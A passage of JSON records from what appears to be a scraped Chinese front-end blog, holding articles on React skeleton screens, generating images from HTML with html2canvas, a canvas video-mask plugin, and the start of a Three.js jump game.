}}\u0026gt;leiwuyi\u0026lt;/span\u0026gt;15999650670\n                                    \u0026lt;/div\u0026gt;\n                                \u0026lt;/div\u0026gt;\n                                \u0026lt;div className=\"block-message\"\u0026gt;\u0026lt;/div\u0026gt;\n                                \u0026lt;div className=\"block-phone\"\u0026gt;\u0026lt;a href=\"15999650670\"\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt;\n                            \u0026lt;/div\u0026gt;\n                        \u0026lt;/div\u0026gt;\n                    })}\n            \u0026lt;/div\u0026gt;\n            {SKELETON}\n        \u0026lt;/div\u0026gt;;\n    )   \n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003edemo2\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eimport React from \"react\";\nimport ReactDom from \"react-dom\";\nimport \"./index.less\";       //必须要有\n\nconst prefix = \"eh-record\";\nexport default class Record extends React.Component {\n\n  componentWillMount() {\n\n  }\n  render() {\n    const { state, props } = this;\n    return \u0026lt;div className={`${prefix}`}\u0026gt;\n                \u0026lt;div className={`${prefix}-block`} SKELETON\u0026gt;   // (1)\n                    \u0026lt;div className={`${prefix}-block-header`}\u0026gt;\n                        \u0026lt;div\u0026gt;复印\u0026lt;/div\u0026gt;\n                        \u0026lt;div\u0026gt;已支付\u0026lt;/div\u0026gt;\n                    \u0026lt;/div\u0026gt;\n                    \u0026lt;div className={`${prefix}-block-date`}\u0026gt;\n                        2012-2-08\n                    \u0026lt;/div\u0026gt;\n                    \u0026lt;div className={`${prefix}-block-filemsg`}\u0026gt;\n                        \u0026lt;div\u0026gt;我问问.word\u0026lt;/div\u0026gt;\n                        \u0026lt;div\u0026gt;￥0.2\u0026lt;/div\u0026gt;\n                    \u0026lt;/div\u0026gt;\n                \u0026lt;/div\u0026gt;\n                {SKELETON}   \n            \u0026lt;/div\u0026gt;;\n  }\n\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eindex.less\u003c/code\u003e文件\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ediv\u003c/code\u003e上的\u003ccode\u003eSKELETON\u003c/code\u003e标记的为skeleton模板\u003c/li\u003e\n\u003cli\u003e模板将替换{\u003ccode\u003eSKELETON\u003c/code\u003e}\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003e效果\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"demo1\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bff513c3cd84b?w=366\u0026amp;h=147\u0026amp;f=png\u0026amp;s=5630\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bff5e7275c9b9?w=372\u0026amp;h=240\u0026amp;f=png\u0026amp;s=4461\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e结尾\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003egithub\u003c/code\u003e地址: \u003ca target=\"_blank\" href=\"https://github.com/Amandesu/ehome-react-skeleton\"\u003e这里\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1515067334.7447","__v":0}
{"_id":{"$oid":"5a4e178e201569114874c012"},"id":"5a3cdac46fb9a045186aee74","author":{"$oid":"5a4e178e201569114874bff5"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"将 HTML 生成图片","meta":{"likeCount":0},"tag":["HTML","Canvas","前端"],"comment":[],"shortContent":"1.将管理员信息使用定位将其设置在指定背景图片上。 1. 使用方法 2. 基本常用API 3. 本地上传头base64编码（回显）","content":"\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"生成效果图片\" src=\"https://user-gold-cdn.xitu.io/2017/12/22/1607db68713a6ba9?w=545\u0026amp;h=397\u0026amp;f=png\u0026amp;s=180193\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e—— Liter\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e项目需求\u003c/h5\u003e\n\u003cp\u003e1.前端添加管理员信息包括（姓名，年龄，头像等）\n2.将管理员信息显示在具体背景图片上，将其生成图片的形式上传后台服务器（\u003cstrong\u003ebase64格式\u003c/strong\u003e或者\u003cstrong\u003e文件的格式\u003c/strong\u003e）\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e实现思路\u003c/h5\u003e\n\u003cp\u003e1.将管理员信息使用定位将其设置在指定背景图片上。\n2.使用html2canvas将指定div生成canvas\n3.将生成的canvas进行base64编码 或者生成文件 上传（建议base64上传）\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e附加功能\u003c/h5\u003e\n\u003cp\u003e本地上传图片 进行base64编码之后回显\n生成canvas之后支持本地下载\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e压缩图片\u003c/h5\u003e\n\u003cp\u003e使用canvas API\n\u003cstrong\u003equality 值越小，所绘制出的图像越模糊 对应图片越小\u003c/strong\u003e 根据需求设置相对应的数值\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e var base64 = canvas.toDataURL(\u003cspan class=\"hljs-string\"\u003e'image/jpeg'\u003c/span\u003e, quality );\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e点击访问\u003ca target=\"_blank\" href=\"http://116.62.168.126/pages/upLoadFile/index.htm\"\u003eDemo地址\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e下面笔记简单介绍html2canvas的使用\u003cbr\u003e\n\u003ca target=\"_blank\" href=\"http://html2canvas.hertzen.com/\"\u003ehtml2canvas官网\u003c/a\u003e\n\u003ca target=\"_blank\" href=\"https://github.com/niklasvh/html2canvas\"\u003egithub\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1. 使用方法\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e html2canvas(document.getElementById(\u003cspan class=\"hljs-string\"\u003e'diploma'\u003c/span\u003e), {\n        onrendered: \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(canvas) {\n            $(\u003cspan class=\"hljs-string\"\u003e'#view'\u003c/span\u003e).html(canvas);  // 容器\n        },\n        width: 547,\n        height: 398\n    });\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003ediploma\u003c/strong\u003e html容器\n\u003cstrong\u003eview\u003c/strong\u003e放置将要生成图片的容器，设置固定宽高（547 * 398）\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e注意：\u003c/strong\u003e  在生成图片的时候\u003cstrong\u003ediploma容器不能被遮挡, 否则不能生成完整的canvas\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2. 基本常用API\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e参数名称\u003c/th\u003e\n\u003cth style=\"text-align:center\"\u003e类型\u003c/th\u003e\n\u003cth style=\"text-align:right\"\u003e默认值\u003c/th\u003e\n\u003cth style=\"text-align:right\"\u003e描述\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003ebackground\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003estring\u003c/td\u003e\n\u003ctd style=\"text-align:right\"\u003e#fff\u003c/td\u003e\n\u003ctd style=\"text-align:right\"\u003e如果使用的是png背景图片这里可是使用如果没有 默认透明\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eheight\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003enumber\u003c/td\u003e\n\u003ctd style=\"text-align:right\"\u003enull\u003c/td\u003e\n\u003ctd style=\"text-align:right\"\u003e需要手动设置\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ewidth\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003enumber\u003c/td\u003e\n\u003ctd style=\"text-align:right\"\u003enull\u003c/td\u003e\n\u003ctd style=\"text-align:right\"\u003e需要手动设置\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etimeout\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003enumber\u003c/td\u003e\n\u003ctd style=\"text-align:right\"\u003e0\u003c/td\u003e\n\u003ctd style=\"text-align:right\"\u003e图片加载延时  默认为0\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etimeout\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003enumber\u003c/td\u003e\n\u003ctd style=\"text-align:right\"\u003e0\u003c/td\u003e\n\u003ctd style=\"text-align:right\"\u003e图片加载延时  默认为0\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e\u003cstrong\u003e其他API参看\u003ca target=\"_blank\" href=\"http://html2canvas.hertzen.com/configuration\"\u003e官网手册\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3. 本地上传头base64编码（回显）\u003c/h3\u003e\n\u003cp\u003eFileReader接口提供了读取文件的方法和包含读取结果的事件模型\n\u003cstrong\u003e主要是将上传的图片文件转换成base64\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e  var r = new FileReader()  \n    r.readAsDataURL(file)  \n    r.onload = \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(e){\n        $(\u003cspan class=\"hljs-string\"\u003e'.avatar img'\u003c/span\u003e).attr(\u003cspan class=\"hljs-string\"\u003e'src'\u003c/span\u003e, e.target.result)  // 将img  src设置base64\n }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e附上\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/FileReader\"\u003eFileReader\u003c/a\u003e对象详细文档\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e4.canvas转base64上传\u003c/h3\u003e\n\u003cp\u003e将html2canvas生成的canvas转换成base64进行上传\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar canvas = document.querySelector(\u003cspan class=\"hljs-string\"\u003e\"#view canvas\"\u003c/span\u003e)\n    var dataURL = canvas.toDataURL(\u003cspan class=\"hljs-string\"\u003e\"image/png\"\u003c/span\u003e);\n    dataURL = dataURL.split(\u003cspan class=\"hljs-string\"\u003e\",\"\u003c/span\u003e)[1];\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e dataURL\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e附上\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/toDataURL\"\u003ecanvas API\u003c/a\u003e文档\u003c/strong\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e注意事项\u003c/h4\u003e\n\u003cp\u003e转换base64的时候需要一定时间可以使用promise函数异步去执行,在没有base64产生的时候执行会报错\u003c/p\u003e\n\u003cp\u003e组后点击下载 使用js将canvas转换成文件进行下载\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eDownload\u003c/span\u003e\u003c/span\u003e(){\n    //cavas 保存图片到本地  js 实现\n    //------------------------------------------------------------------------\n    //1.确定图片的类型  获取到的图片格式 data:image/Png;base64,......\n    var \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e =\u003cspan class=\"hljs-string\"\u003e'png'\u003c/span\u003e;//你想要什么图片格式 就选什么吧\n    var d=document.querySelector(\u003cspan class=\"hljs-string\"\u003e'#view canvas'\u003c/span\u003e);\n    var imgdata=d.toDataURL(\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e);\n    //2.0 将mime-type改为image/octet-stream,强制让浏览器下载\n    var fixtype=\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e){\n        \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=type.toLocaleLowerCase().replace(/jpg/i,\u003cspan class=\"hljs-string\"\u003e'jpeg'\u003c/span\u003e);\n        var r=type.match(/png|jpeg|bmp|gif/)[0];\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'image/'\u003c/span\u003e+r;\n    };\n    imgdata=imgdata.replace(fixtype(\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e),\u003cspan class=\"hljs-string\"\u003e'image/octet-stream'\u003c/span\u003e);\n    //3.0 将图片保存到本地\n    var savaFile=\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(data,filename)\n    {\n        var save_link=document.createElementNS(\u003cspan class=\"hljs-string\"\u003e'http://www.w3.org/1999/xhtml'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e);\n        save_link.href=data;\n        save_link.download=filename;\n        var event=document.createEvent(\u003cspan class=\"hljs-string\"\u003e'MouseEvents'\u003c/span\u003e);\n        event.initMouseEvent(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e,\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,window,0,0,0,0,0,\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,0,null);\n        save_link.dispatchEvent(event);\n    };\n    var filename=\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e+new Date().getDate()+\u003cspan class=\"hljs-string\"\u003e'.'\u003c/span\u003e+\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e;\n    //直接用当前几号做的图片名字\n    savaFile(imgdata,filename);\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch6 class=\"heading\"\u003e只是个Demo 仅供参考 代码较乱 有待提高\u003c/h6\u003e\n","buildTime":"1515062152.3031","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac82"},"id":"5a4d7e676fb9a044fc4524fd","author":{"$oid":"5a4e17dee8405d2778beac7b"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"基于canvas的视频遮罩插件","meta":{"likeCount":0},"tag":["Canvas","前端","GitHub","图片资源"],"comment":[],"shortContent":"为一个视频添加一个覆盖物，从而挡住视频某区域，在视频的某一时间段，比如第10到第20分钟不显示划定的这块区域。应用场景包括遮挡卫视图标、遮挡视频右下角广告、充当马赛克等。 一个长视频可能包含多个遮罩，每个遮罩有特定的显示时间（在此时间外，隐藏该遮罩）。 有基于div和基于can…","content":"\u003cp\u003e作者：云荒杯倾\u003cbr\u003e\n\u003ca target=\"_blank\" href=\"https://cunzaizhuyi.github.io\"\u003e作者博客\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e视频遮罩介绍\u003c/h2\u003e\n\u003cp\u003e为一个视频添加一个覆盖物，从而挡住视频某区域，在视频的某一时间段，比如第10到第20分钟不显示划定的这块区域。应用场景包括\u003cstrong\u003e遮挡卫视图标\u003c/strong\u003e、\u003cstrong\u003e遮挡视频右下角广告\u003c/strong\u003e、\u003cstrong\u003e充当马赛克\u003c/strong\u003e等。\u003c/p\u003e\n\u003cp\u003e一个长视频可能包含多个遮罩，每个遮罩有特定的显示时间（在此时间外，隐藏该遮罩）。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e前端实现视频遮罩\u003c/h2\u003e\n\u003cp\u003e有\u003cstrong\u003e基于div\u003c/strong\u003e和\u003cstrong\u003e基于canvas\u003c/strong\u003e两种技术方案，本文是使用canvas完成的。\u003c/p\u003e\n\u003cp\u003e主要原理是在HTML的video标签上贴上一个透明的canvas图层，然后响应mousedown、mousemove、mouseup事件。\n由于canvas事件只是基于canvas元素，所以canvas内部每个元素（一个矩形，一个圆等）的事件响应要利用坐标来自己代码完成。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e插件GitHub地址\u003c/h2\u003e\n\u003cp\u003ehttps://github.com/cunzaizhuyi/maskPlugin\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e演示地址\u003c/h2\u003e\n\u003cp\u003ehttp://htmlpreview.github.io/？https://github.com/cunzaizhuyi/maskPlugin/blob/master/mask/mask.html\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e实现的功能点\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e画遮罩（矩形）\u003c/li\u003e\n\u003cli\u003e设置遮罩样式（提供API）\u003c/li\u003e\n\u003cli\u003e遮罩移动\u003c/li\u003e\n\u003cli\u003e遮罩缩放\u003c/li\u003e\n\u003cli\u003ecanvas上鼠标样式变换\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e封装的API\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e名称\u003c/th\u003e\n\u003cth\u003e值类型\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e1、矩形相关设置\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003efillStyle\u003c/td\u003e\n\u003ctd\u003e颜色值\u003c/td\u003e\n\u003ctd\u003e矩形填充色, 默认为'#eeeeee'\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003estrokeStyle\u003c/td\u003e\n\u003ctd\u003e颜色值\u003c/td\u003e\n\u003ctd\u003e矩形边界线颜色, 默认为'#0000ff'\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003einRectCursor\u003c/td\u003e\n\u003ctd\u003e字符串\u003c/td\u003e\n\u003ctd\u003e当鼠标处于某个小矩形内部时鼠标样式，默认为'move'。可以设置为'pointer'之类的。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e2、矩形边界上的八个小矩形 相关设置\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ebRectsStrokeStyle\u003c/td\u003e\n\u003ctd\u003e颜色值\u003c/td\u003e\n\u003ctd\u003e矩形边界上的小矩形的颜色，默认为'#0000ff'\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ebSideLength\u003c/td\u003e\n\u003ctd\u003enumber\u003c/td\u003e\n\u003ctd\u003e矩形边界上小矩形的边长值，默认为6\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e3、遮罩时间相关\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003emasksTime\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003ctd\u003e每个遮罩的开始显示时间和结束显示时间，一个遮罩对应一个矩形\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003emasksTime举例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e[{\n    maskId: 1,\n    startTime: 0,\n    endTime: 10,\n}, {maskId: 2,\n    startTime: 3,\n    endTime: 13,\n}]\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e最后\u003c/h2\u003e\n\u003cp\u003e这个基于原生canvas的700多行的小插件，对于探索canvas的世界可能仅仅是一个开始。\u003c/p\u003e\n\u003cp\u003e关于这个小插件有任何疑问，欢迎大家交流。\u003c/p\u003e\n","buildTime":"1515066662.1081","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac81"},"id":"5a4cc3db6fb9a04514646fd3","author":{"$oid":"5a4e17dee8405d2778beac73"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"Three.js 再探 - 写一个跳一跳极简版游戏","meta":{"likeCount":0},"tag":["游戏","three.js"],"comment":[],"shortContent":"2. 掉落在起跳方块左边上沿 3. 掉落在左边下一个方块下沿 4. 掉落在左边下一个方块上沿 5. 掉落在起跳方块右边上沿 6. 掉落在右边下一个方块下沿 7. 掉落在右边下一个方块上沿","content":"\u003cp\u003e最近在离职的空窗期，感觉大把的时间不能用来浪费，就试着仿照微信跳一跳写了一个极简版的游戏\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e那么这个游戏到底是简单到什么程度，差不多就是到下面这个程度吧\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"预览1\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bbe05827776f7?w=800\u0026amp;h=600\u0026amp;f=png\u0026amp;s=6172\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n\u003cfigure\u003e\u003cimg alt=\"预览2\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bbe09a424990b?w=800\u0026amp;h=600\u0026amp;f=png\u0026amp;s=5907\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n\u003cfigure\u003e\u003cimg alt=\"预览3\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bbe0fa4230275\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e预览地址: \u003ca target=\"_blank\" href=\"https://luosijie.github.io/threejs-examples/jump/jump.html\"\u003ehttps://luosijie.github.io/threejs-examples/jump/jump.html\u003c/a\u003e\u003c/h4\u003e\n\u003ch4 class=\"heading\"\u003e源码地址: \u003ca target=\"_blank\" href=\"https://github.com/luosijie/threejs-examples/tree/master/jump\"\u003ehttps://github.com/luosijie/threejs-examples/tree/master/jump\u003c/a\u003e\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e由于是第一次尝试写游戏, 也不知道套路对不对, 大家看着玩就好, 不要太认真, 不推荐在手机上预览, 坑还没有填好\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch4 class=\"heading\"\u003e下面是实现过程\u003c/h4\u003e\n\u003ch3 class=\"heading\"\u003e游戏分析\u003c/h3\u003e\n\u003cp\u003e首先分析一下一个这样的游戏需要什么元素\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThree.js必备元素: 场景，灯光，摄像机\u003c/li\u003e\n\u003cli\u003e一块又一块的方块\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e会跳的那个\u003c/strong\u003e，或者叫游戏者\u003c/li\u003e\n\u003cli\u003e以上\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e游戏过程\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e初始一个场景, 场景中有一个 \u003cstrong\u003e会跳的那个\u003c/strong\u003e 和 2个方块\u003c/li\u003e\n\u003cli\u003e鼠标按下储存 能量值\u003c/li\u003e\n\u003cli\u003e鼠标放开, \u003cstrong\u003e会跳的那个\u003c/strong\u003e 根据 能量值 和 第2个方块的方向 跳出去\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e会跳的那个\u003c/strong\u003e 落到方块的上平面时, 根据 位置 判断这一跳是成功还是失败\u003c/li\u003e\n\u003cli\u003e成功后进入下一步，失败就根据 位置 执行不同的摔倒方式\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 class=\"heading\"\u003e关于游戏的碰撞, 我们要考虑这几种情况\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e掉落在两个方块中央\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"掉落在两个方块中央\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bbe18b2b0b738?w=800\u0026amp;h=600\u0026amp;f=png\u0026amp;s=4868\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n2. 掉落在起跳方块左边上沿\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"掉落在起跳方块左边上沿\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bbe216ec4fb56?w=800\u0026amp;h=600\u0026amp;f=png\u0026amp;s=3785\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n3. 掉落在左边下一个方块下沿\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"掉落在左边下一个方块下沿\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bbe285006a434?w=800\u0026amp;h=600\u0026amp;f=png\u0026amp;s=3841\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n4. 掉落在左边下一个方块上沿\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"掉落在左边下一个方块上\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bbe34e9a2987f?w=800\u0026amp;h=600\u0026amp;f=png\u0026amp;s=3883\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n5. 掉落在起跳方块右边上沿\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"掉落在起跳方块右边上沿\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bbe3c7e648d6c?w=800\u0026amp;h=600\u0026amp;f=png\u0026amp;s=3816\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n6. 掉落在右边下一个方块下沿\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"掉落在右边下一个方块下沿\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bbe433e0b025a?w=800\u0026amp;h=600\u0026amp;f=png\u0026amp;s=3751\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n7. 掉落在右边下一个方块上沿\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"掉落在右边下一个方块上沿\" src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bbe4a1716d89f?w=800\u0026amp;h=600\u0026amp;f=png\u0026amp;s=3581\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e代码\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e感兴趣的麻烦移步 \u003ca target=\"_blank\" href=\"https://github.com/luosijie/threejs-examples/tree/master/jump\"\u003egithub\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e主体结构\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e Game = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  ...\n}\nGame.prototype = {\n  \u003cspan class=\"hljs-attr\"\u003einit\u003c/span\u003e:  \u003cspan class=\"hljs-comment\"\u003e// 初始化\u003c/span\u003e\n  restart: \u003cspan class=\"hljs-comment\"\u003e// 重新开始\u003c/span\u003e\n  addSuccessFn:  \u003cspan class=\"hljs-comment\"\u003e// 成功进入下一步，执行外部函数, 用于更新分数\u003c/span\u003e\n  addFailedFn: \u003cspan class=\"hljs-comment\"\u003e// 游戏失败, 执行外部函数, 用于显示失败弹窗\u003c/span\u003e\n  _createJumper: \u003cspan class=\"hljs-comment\"\u003e// 创建 会跳的那个\u003c/span\u003e\n  _createCube: \u003cspan class=\"hljs-comment\"\u003e// 创建方块\u003c/span\u003e\n  _setLight: \u003cspan class=\"hljs-comment\"\u003e// Three.js设置光照\u003c/span\u003e\n  _setCamera: \u003cspan class=\"hljs-comment\"\u003e// Three.js设置相机\u003c/span\u003e\n  _setRenderer: \u003cspan class=\"hljs-comment\"\u003e// Three.js设置渲染器\u003c/span\u003e\n  _render: \u003cspan class=\"hljs-comment\"\u003e// Three.js 执行渲染\u003c/span\u003e\n  _createHelpers: \u003cspan class=\"hljs-comment\"\u003e// Three.js场景辅助工具\u003c/span\u003e\n  _checkUserAgent: \u003cspan 